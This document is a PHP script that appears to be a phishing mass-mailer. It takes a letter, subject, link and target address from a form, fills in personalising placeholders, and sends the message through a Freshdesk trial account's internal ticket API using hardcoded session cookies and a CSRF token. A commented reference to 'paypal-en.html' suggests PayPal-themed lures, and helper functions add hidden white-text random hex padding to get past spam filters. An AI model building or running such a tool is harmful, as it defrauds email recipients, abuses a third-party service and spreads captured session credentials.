<?php 
// Generated by curl-to-PHP: http://incarnate.github.io/curl-to-php/
if(!is_email($_POST['email']))
    echo("Incorrect Email");
else if ( isset($_POST['email'])) {
//     $myfile = fopen("paypal-en.html", "r") or die("Unable to open file!");
// $letter=fread($myfile,filesize("paypal-en.html"));
$email=$_POST['email'];
$link=$_POST['link'];
$letter=$_POST['letter'];
$subject=$_POST['subject'];
//$link2=$_POST['link2'];

$letter=randdomz($letter,$email,$link);
$subject=randdomz($subject,$email,$link);

//$letter=lettering($letter);

$body= array("subject"=>$subject,"description"=>$letter,"status"=>5,"priority"=>1,"email"=>"$email","email_config_id"=>69000041156);
$body=json_encode($body);  
// print_r($body); 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://newaccount1614560919026.freshdesk.com/api/_/tickets/outbound_email');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"subject":"'.$subject.'","description":"'.$letter.'","status":5,"priority":3,"email":"'.$email.'","custom_fields":{},"email_config_id":69000041156}');
curl_setopt($ch, CURLOPT_POSTFIELDS,$body);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Origin: https://newaccount1614560919026.freshdesk.com';
$headers[] = 'Accept-Encodng: gzip, deflate, br';
$headers[] = 'X-Csrf-Token: wRJV1bJRriZbr3rDoVMJrTVeD7gwyZOpnqiBRS2AFeM=';
$headers[] = 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'cookie:zarget_user_id=1eece6e4-2914-4a4a-a101-9d3d0c6074c8; fm_sid_455057515A425C435B50595150585F5B5D5E=1614565442705d0.36361290128394796; _fw_crm_v=2efb8c25-4bd7-4f58-f492-5343b1958da7; _gcl_au=1.1.2094277799.1614565443; mkjs_user_id=null; mkjs_group_id=null; _fbp=fb.1.1614565443488.493921894; __adroll_fpc=5c592160cf78566478badec8f50840e9-1614565444269; _ga=GA1.2.57816942.1614565444; _gid=GA1.2.150278735.1614565444; zarget_visitor_info=%7B%22BWRWQV_%22%3A1636377%2C%22KSVSTP%22%3A827262%2C%22BQTXRX%5D%22%3A1059095%7D; __qca=P0-324853720-1614565445759; mkjs_anonymous_id=%225977eb52-49a0-4294-86f0-0ebcddc19ed2%22; _uetsid=311cbd707a3511ebb7a28b5c4b2d1cfb; _uetvid=311d17407a3511ebb098cd97217511ab; zarget_goal_info=%7B%22455057515A4258455C545E56454C585F5B5D5E%22%3A%5B1636379%2C1636380%5D%7D; _rdt_uuid=1614565471591.8a52289d-e791-4162-9630-7185893d5fc7; __ar_v4=OPQNUQ6TQRCGLEGMHLTLPF%3A20210231%3A3%7CZYKGPV4HWBGO5DGRCZY6XP%3A20210231%3A3; _x_w=41; helpdesk_node_session=0f107bb58ec93b16e7010444e5c198081720180c1813c0395ce9705522c3d4c597f55af5e3eae9937388bb890ff9198e21a8043a4f6af7550f5ceac8af509248; fd=59ca5d23-c6dd-40cd-bfd3-19beecdb4e6a; service_worker=true; _hp2_props.2826793817=%7B%22account_state%22%3A%22trial%22%2C%22account_plan%22%3A%22Forest%20Jan%2020%22%2C%22billing_cycle%22%3A1%7D; _fw_crm_v=2efb8c25-4bd7-4f58-f492-5343b1958da7; _hp2_ses_props.2826793817=%7B%22r%22%3A%22https%3A%2F%2Ffreshdesk.com%2Fsignup%2Fthank-you%3Fredirect%3Dhttps%253A%252F%252Fnewaccount1614560919026.freshdesk.com%252Fsignup_complete%252Ff0MRMG7xY4Onteam635Q%26aid%3D1845264%26mSegment%3Dgood%26ehash%3Ddd3cd2519940704cb1fdf802b40f4aac6748cc36a034d1c4b9090e0be9d6fb41%22%2C%22ts%22%3A1614565516765%2C%22d%22%3A%22newaccount1614560919026.freshdesk.com%22%2C%22h%22%3A%22%2Fa%2Fgetstarted%22%7D; _BEAMER_USER_ID_CkAnkUkX19260=8dfc9fcb-10f3-4371-b86d-a10795f864b6; _BEAMER_FIRST_VISIT_CkAnkUkX19260=2021-03-01T02:25:17.538Z; _BEAMER_FILTER_BY_URL_CkAnkUkX19260=false; user_credentials=BAhJIgGNMjU0OGFjZDdlODU0N2E0MzA0ZWE3NWM0NWU1NjVhY2ZhZTQ3NGJhNjM0OTkzNTEwMDk4YjZlZjQ4YTE4ZmVmODYxZTA0ZmM0OTNmM2ZjZDBlZWNkYmJkYmRlYWQ3MDI3OTQ2ZTEzNDcyMjY5NzE3NjA5MDI5MDU4MTM0MWQ4MDQ6OjY5MDAyNDU1Mzk0BjoGRVQ%3D--f7080b658952a208d72efbcc41bf02a83cf5a99d; helpdesk_url=newaccount1614560919026.freshdesk.com; session_state=MzI4MWRjMGExNjk3ZTRhOWVjM2FjNGEwZjZlYzJhMTk1Y2E5YjE0Y2VkMjcwYjEzY2I4Zjk2ZWM3OTk2OGU0Mg%3D%3D.286323681397097963; session_token=ebee81e8e4507dc70bf40986b942f3c6af8bae10750bed3f1523b0bd0c812dea199e4f511cf2ed4b7ed045af81a0353a780c0892d3ea6bd2ed1e74876479c3552ebdc43952475b5eca351d9b17be601343667c9ede55542b939be0ead23173ee30ff96615c267efe0bfeaf22d94cfdcb11f31bf32c08573de5a4a4c2c4246f7d; _x_m=; _helpkit_session=BAh7DEkiD3Nlc3Npb25faWQGOgZFVEkiJTdhM2VjNzU5OGViYzRiZjY1YWUxNzhmYzk2MDk4NjBmBjsAVEkiFXVzZXJfY3JlZGVudGlhbHMGOwBUSSIBgDI1NDhhY2Q3ZTg1NDdhNDMwNGVhNzVjNDVlNTY1YWNmYWU0NzRiYTYzNDk5MzUxMDA5OGI2ZWY0OGExOGZlZjg2MWUwNGZjNDkzZjNmY2QwZWVjZGJiZGJkZWFkNzAyNzk0NmUxMzQ3MjI2OTcxNzYwOTAyOTA1ODEzNDFkODA0BjsAVEkiGHVzZXJfY3JlZGVudGlhbHNfaWQGOwBUbCsIYundEBAASSIQX2NzcmZfdG9rZW4GOwBUSSIxd1JKVjFiSlJyaVpicjNyRG9WTUpyVFZlRDdnd3laT3BucWlCUlMyQUZlTT0GOwBGSSISZmxhc2hfbWVzc2FnZQY7AEZJIi5Zb3UgbXVzdCBiZSBsb2dnZWQgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZQY7AFRJIg5hdXRob3JpemUGOwBGVEkiI2ZyZXNoaWRfYXV0aF9mYWlsdXJlX3JldHVybl90bwY7AEZJIhMvc3VwcG9ydC9sb2dpbgY7AFQ%3D--4336dbcdc56752234e5e78642adf4a46eb9c5484; _hp2_id.2826793817=%7B%22userId%22%3A%225572105262024287%22%2C%22pageviewId%22%3A%222734335114112026%22%2C%22sessionId%22%3A%228567715787774619%22%2C%22identity%22%3A%2269002455394%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D';
$headers[] = 'X-Client-Instance-Id: 1614565685892';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44';
$headers[] = 'Content-Type: application/json; charset=UTF-8';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Referer: https://newaccount1614560919026.freshdesk.com/a/tickets/compose-email';
$headers[] = 'Authority: newaccount1614560919026.freshdesk.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);


$array=htmlspecialchars($result);
echo json_encode($array) ;
}



function negative()
{
    $negative='<p style=\"color:#fff\">';
$part1=(rand(20,60));
$part2=(rand(20,60));

$negative.= hex(30,true,$part1);
$negative.= hex(4,false,$part2);
$negative.= hex(30,false,$part1);
$negative.= hex(4,false,$part2);
$negative.= hex(30,false,$part1);
$negative.= hex(4,false,$part2);
$negative.='</p>';
return $negative;
}

function hex($strllen,$length=true,$number)
{
$all='';
for ($x = 0; $x <= $number; $x++) {
     $randHexStr = implode( array_map( function() { return dechex( mt_rand( 0, 15 ) ); }, array_fill( 0, $strllen, null ) ) );
     if ($length==true)
     {
     $randHexStr=stringInsert($randHexStr,'-',8);
     $randHexStr=stringInsert($randHexStr,'-',13);
     $randHexStr=stringInsert($randHexStr,'-',17);
     $randHexStr=stringInsert($randHexStr,'-',22);
     }

     $all.=$randHexStr.' ';
} 



    
     
     return '<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>'.$all;
}

function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;
}


function stringInsert($str,$insertstr,$pos)
{
    $str = substr($str, 0, $pos) . $insertstr . substr($str, $pos);
    return $str;
} 

function randString($consonants, $min_length, $max_length) {
    $length=rand($min_length, $max_length);
    $password = '';
    for ($i = 0; $i < $length; $i++) {
            $password .= $consonants[(rand() % strlen($consonants))];
    }
    return $password;
}


function randdomz($text,$email,$link){
    $emailuser = preg_replace('/([^@]*).*/', '$1', $email);
    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-email-]", $email, $text);
    $text = str_replace("[-emailuser-]", $emailuser, $text);
    $text = str_replace("[-link-]", $link, $text);
    $text = str_replace("[-randomletters-]", randString('abcdefghijklmnopqrstuvwxyz', 8, 15), $text);
    $text = str_replace("[-randomstring-]", randString('abcdefghijklmnopqrstuvwxyz0123456789', 8, 15), $text);
    $text = str_replace("[-randomnumber-]", randString('0123456789', 7, 15), $text);
    $text = str_replace("[-randommd5-]", md5(rand()), $text);
    return $text;
}
function lettering($letter)
{
    // $letter=stripslashes($letter);
    $letter=str_replace('"', '\"', $letter);
    // $letter=str_replace("'", "\'", $letter);
    
    $letter=str_replace("\n","<br>",$letter);
    return $letter;
}

 ?>